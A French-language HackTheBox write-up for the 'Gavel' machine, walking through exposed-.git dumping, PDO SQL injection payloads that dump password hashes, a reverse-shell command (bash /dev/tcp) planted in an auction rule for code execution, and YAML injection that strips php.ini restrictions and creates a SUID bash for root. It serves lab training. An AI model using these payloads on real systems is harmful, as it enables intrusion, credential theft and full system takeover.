---
date: 2026-03-14T04:27:01-05:00
# description: ""
# image: "/images/HTB-Gavel/gavel.png"
lastmod: 2026-03-14
showTableOfContents: true
tags: ["Hackthebox", "SQLi", "PDO-SQLi", "YAML-injection", "git-exposed", "source-code-review"]
categories: ["Writeups"]
title: "HTB: Gavel"
type: "post"
---

* Platforme: HackTheBox
* Lien: [Gavel](https://app.hackthebox.com/machines/Gavel)
* Niveau: Moyen
* OS: Linux
---

Gavel débute par l’énumération d’un dépôt `.git` exposé, permettant d’accéder au code source de l’application. Une analyse approfondie met ensuite en évidence une injection SQL structurelle dans une requête PDO, permettant l’extraction des identifiants administrateur. Après authentification en tant qu’administrateur, un mécanisme de règles dynamiques vulnérable présent dans le panneau d’administration est exploité afin d’obtenir une exécution de code à distance et un premier shell sur la machine. L’énumération du système révèle par la suite l’existence d’un binaire privilégié lié à ce mécanisme, qui est utilisé pour désactiver les contrôles de sécurité PHP et élever les privilèges jusqu’à root en altérant le binaire bash.

# Balayage

```
nmap -sC -sV -oA nmap/Gavel {TARGET_IP}
```

**Résultats**
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-13 09:50 EDT
Nmap scan report for 10.129.8.19 (10.129.8.19)
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
|_  256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)

80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://gavel.htb/
Service Info: Host: gavel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.38 seconds
```

Deux ports ouverts ont été détectés :
* 22 - SSH avec `OpenSSH 8.9p1`
* 80 - HTTP avec `Apache 2.4.52` et une redirection vers `gavel.htb`

```
sudo echo "{IP} gavel.htb" | sudo tee -a /etc/hosts
```

# Énumération

À l'adresse `http://gavel.htb/`, on trouve un site d'enchères proposant des biens virtuels.

![Gavel website](/images/HTB-Gavel/gavel_website.png)

Le site web propose également des fonctionnalités d'authentification. 

![Gavel sign up page](/images/HTB-Gavel/gavel_register.png)

Après avoir créé un compte et nous être connectés, nous avons accès à davantage de fonctionnalités.

![Gavel account features](/images/HTB-Gavel/gavel_features.png)

L'option `Inventory` redirige vers `http://gavel.htb/inventory.php`.

![Gavel inventory](/images/HTB-Gavel/gavel_inventory.png)

Le bouton `Bidding` redirige vers `http://gavel.htb/bidding.php`.

![Gavel bidding](/images/HTB-Gavel/gavel_bidding.png)

Nous poursuivons l'énumération par une attaque par force brute sur les répertoires.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://gavel.htb
```

![Gobuster command](/images/HTB-Gavel/gavel_gobuster.png)

Nous trouvons plusieurs répertoires intéressants:
- `.git`
- `admin.php`

Nous extrayons le répertoire `.git` à l'aide de [git-dumper](https://github.com/arthaud/git-dumper).

```
python3 -m venv myvenv
source myvenv/bin/activate
pip install git-dumper
```

```
git-dumper http://gavel.htb/.git/ git_gavel
```

## Détection d'injection SQL

Nous analysons les différents fichiers et identifions certains passages de code vulnérables.

![SQLi in source code](/images/HTB-Gavel/gavel_sqli_code.png)

L'application utilise des requêtes préparées PDO (PHP Data Objects). Cependant, les paramètres `sort` et `user_id` sont directement acceptés dans l'URL. En l'absence d'un filtrage adéquat des données saisies, cela peut entraîner une vulnérabilité de type injection SQL. [Sur ce site](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#pdo-prepared-statements), nous apprenons comment exploiter les failles SQLi dans les requêtes préparées PDO.

La logique de `bid_handler.php` récupère le champ `rule` depuis la table `auctions` et le transmet directement à `runkit_function_add()` comme corps d’une fonction `ruleCheck()` générée dynamiquement. Étant donné que cette fonction est exécutée immédiatement après sa création, le contrôle du champ `rule` se traduit directement par une exécution arbitraire de code PHP.

![bid_handler code](/images/HTB-Gavel/bid_handler.png)

Comme indiqué ci-dessous, l'inventaire du compte créé affiche certains éléments après avoir remporté une enchère.

![Gavel inventory items](/images/HTB-Gavel/gavel_inventory.png)

Conformément à l'article, nous testons la vulnérabilité à l'aide des payloads spécifiés.

```
# 1st Payload: ?#\0
# 2nd Payload: x`;#
```

```
http://gavel.htb/inventory.php?sort=%3f%23%00&user_id=x%60;%23
```

Dans des conditions normales, l'inventaire affiche les objets appartenant au compte créé. Cependant, lors de l'injection des payloads, l'application renvoie un inventaire vide. Cela prouve que la logique de la requête SQL sous-jacente a été altérée.

![Gavel empty directory](/images/HTB-Gavel/inventory_empty.png)

Nous utilisons ensuite la payload SQLi (SQL injection) .
```
http://gavel.htb/inventory.php?sort=\?;--+-%00&user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&
```

Il exécute différentes tâches:
- Le paramètre `sort` injecte un placeholder (`?`) échappé par un antislash, suivi d’une séquence de commentaire.
```
sort=\?;-- -
```
Cette séquence interrompt l'analyse syntaxique du PDO et tronque de facto le reste de la requête prévue.
- Il en résulte que le paramètre `user_id` génère une requête imbriquée:
```
x` FROM (
    SELECT group_concat(username,0x3a,password) AS `x`
    FROM users
)y;-- -
```
En fermant le contexte des backticks et en injectant une requête dérivée qui agrège les valeurs `username:hash`, le payload force la base de données à renvoyer des données d’identification dans le contenu de l’inventaire. Le fait de commenter le reste de la requête garantit une exécution réussie, confirmant une injection SQL complète par manipulation structurelle de la requête préparée.


![leaked database data](/images/HTB-Gavel/gavel_pwd_hashes.png)

Le hachage du mot de passe de l'utilisateur `auctioneer` est renvoyé.
```
auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
```

Nous le déchiffrons et obtenons le mot de passe `midnight1`.

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![auctioneer password](/images/HTB-Gavel/auctioner_pwd.png)

Nous nous connectons avec les identifiants nouvellement obtenus. Nous avons désormais accès au panneau d'administration (`Admin Panel`).

![auctioneer login](/images/HTB-Gavel/auctioneer_login.png)

# Accès initial

Dans `Admin Panel`, nous pouvons ajouter des règles aux différents articles mis aux enchères.

![admin panel rules](/images/HTB-Gavel/admin_panel_rule.png)

Comme nous l'avons vu précédemment, ces règles sont traitées par la fonction `runkit_function_add()`, ce qui entraîne l'exécution de code sur le serveur.

Notre exploitation se déroule donc en quatre étapes:

1. Enchérir en tant que `auctioneer`

![admin panel rules](/images/HTB-Gavel/gavel_place_bid.png)


2. Récupérez les valeurs du paramètre `auction_id`

> Nous savons que `auction_id` est le paramètre utilisé, car il figure dans le code source de la page. Il est également visible dans les requêtes si l'on utilise Burp.
> Étant donné que chaque enchère est limitée dans le temps et associée à un identifiant unique (`auction_id`), les étapes de l'exploitation doivent êtres réalisées avant l'expiration de l'enchère, après quoi cet identifiant n'est plus valide.

```
curl -s http://gavel.htb/bidding.php -H 'Cookie: gavel_session=COOKIE_VALUE' | grep 'auction_id'
```

![Get auction IDs](/images/HTB-Gavel/auction_IDs.png)

3. Ajoutez une commande RCE en tant que règle.

```
system('bash -c "bash -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1"'); return true;
```

![RCE command as rule](/images/HTB-Gavel/rule_RCE.png)


4. Déclencher la payload RCE

```
curl -X POST http://gavel.htb/includes/bid_handler.php \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Cookie: gavel_session=<COOKIE_VALUE>' \
  -d 'auction_id=<ID_NUMBER>&bid_amount=<VALUE>'
  ```
![RCE trigger](/images/HTB-Gavel/rule_rce_trigger.png)

Sur notre listener, nous obtenons un shell sous le nom d'utilisateur `www-data`.

![Foothold on the Gavel machine](/images/HTB-Gavel/gavel_foothold.png)

En consultant le fichier `/etc/passwd`, on constate que l'utilisateur `auctioneer` existe bien. Le mot de passe que nous avons utilisé sur l'application Web est valide pour ce compte utilisateur.

![Gavel user flag](/images/HTB-Gavel/gavel_user_flag.png)

## Explication de l'exploitation

Cette faille fonctionne parce que l'application exécute le contenu du champ `rule` de l'enchère en tant que code PHP chaque fois qu'une enchère est soumise.

Lorsque nous envoyons une requête POST à `includes/bid_handler.php`, l'application :

1. charge la ligne d'enchère correspondant à l'`auction_id` fourni
2. lit la valeur de la `rule` de cette enchère
3. utilise `runkit_function_add()` pour transformer cette règle en une fonction PHP active
4. invoque immédiatement cette fonction afin de déterminer si l'enchère est autorisée

Revenons au code vulnérable:
```PHP
$rule = $auction['rule'];

if (function_exists('ruleCheck')) {
    runkit_function_remove('ruleCheck');
}
runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
$allowed = ruleCheck($current_bid, $previous_bid, $bidder);
```

Lorsque nous modifions le champ `rule` comme suit:
```
system('bash -c "bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1"'); return true;
```

L’application s’exécute et construit:
```PHP
function ruleCheck($current_bid, $previous_bid, $bidder) {
    system('bash -c "bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1"');
    return true;
}
```

C’est la raison pour laquelle notre commande de reverse shell s'exécute lorsque nous plaçons et remportons une enchère en tant que `auctioneer`.

En résumé, l’exploitation réussit parce que `bid_handler.php` traite le champ `rule` de la base de données comme du code PHP. Lorsqu’une enchère est soumise, l’application compile ce champ en une fonction exécutée à l’exécution via `runkit_function_add()`, puis l’exécute. En intégrant une commande de shell inversé dans le corps de la règle, l'application déclenche l'exécution de code à distance à la fin de l'enchère.

> Notre payload fonctionne uniquement parce que PHP est autorisé à appeler system().

# Élévation des privilèges

Dans `/opt/gavel/`, nous trouvons:

- `gaveld` - un fichier binaire que nous ne pouvons pas exécuter
- `.config` - le répertoire de configuration PHP (`php.ini` se trouve plus loin, dans `/opt/gavel/.config/php/)
- nous ne pouvons pas accéder au répertoire `submission` et `sample.yaml` affiche la structure d'un article mis aux enchères.

![opt directory content](/images/HTB-Gavel/Gavel_opt.png)

![sample YAML file](/images/HTB-Gavel/sample_yaml.png)

Dans `/usr/local/bin`, on trouve `gavel-util`, un autre fichier binaire que l'on peut exécuter. Il accepte un fichier YAML afin de soumettre de nouveaux lots aux enchères.

![gavel_util file](/images/HTB-Gavel/gavel_util.png)

En exécutant la commande `systemctl list-units --type=service --state=running`, on constate que le service `gaveld.service` s'exécute en tant que root.

![gaveld service](/images/HTB-Gavel/gaveld_service.png)

Une fois de plus, nous exploitons le champ `rule` pour élever nos privilèges au niveau root. Dans `sample.yaml`, nous voyons que le champ `rule` est utilisé. Nous allons mener une attaque par injection YAML, mais nous commençons par désactiver certaines restrictions PHP :

> L'image ci-dessous montre le fichier php.ini d'origine.

![original php.ini file](/images/HTB-Gavel/phi_ini_OG.png)

```
echo 'name: newini' > new_ini.yaml
echo 'description: fix php ini' >> new_ini.yaml
echo 'image: "x.png"' >> new_ini.yaml
echo 'price: 1' >> new_ini.yaml
echo 'rule_msg: "newini"' >> new_ini.yaml
echo "rule: file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;" >> new_ini.yaml
```

Nous soumettons le fichier.
```
/usr/local/bin/gavel-util submit /home/auctioneer/new_ini.yaml
```

![YAML file to disable PHP restrictions](/images/HTB-Gavel/new_ini.png)

Après avoir attendu quelques secondes pour que le fichier YAML soit traité, nous vérifions à nouveau le fichier `php.ini` : il comporte désormais beaucoup moins de restrictions. Nous avons supprimé deux restrictions majeures:
* `open_basedir=/opt/gavel` - cette option limite les répertoires auxquels les scripts PHP sont autorisés à accéder.
* `disable_functions` - cette option bloque l'exécution de diverses fonctions PHP dangereuses ; en la définissant avec une liste vide, nous les autorisons pratiquement toutes.  

![modified php.ini file](/images/HTB-Gavel/modified_php-ini.png)

Nous soumettons à présent un autre fichier YAML afin de modifier le binaire bash.

```
echo 'name: gavelroot' > gavelroot.yaml
echo 'description: make suid bash' >> gavelroot.yaml
echo 'image: "x.png"' >> gavelroot.yaml
echo 'price: 1' >> gavelroot.yaml
echo 'rule_msg: "rootshell"' >> gavelroot.yaml
echo "rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;" >> gavelroot.yaml
```

Soumission du fichier YAML
```
/usr/local/bin/gavel-util submit /home/auctioneer/gavelroot.yaml
```

```
ls -lh /opt/gavel/
```

Nous disposons désormais d'une copie du binaire bash avec le bit SUID activé.

![Gavel SUID bash](/images/HTB-Gavel/gavel_SUID_bash.png)

Nous lançons un shell root et lisons le drapeau root.
```
/opt/gavel/rootbash -p
```

![Gavel root shell](/images/HTB-Gavel/Gavel_root.png)











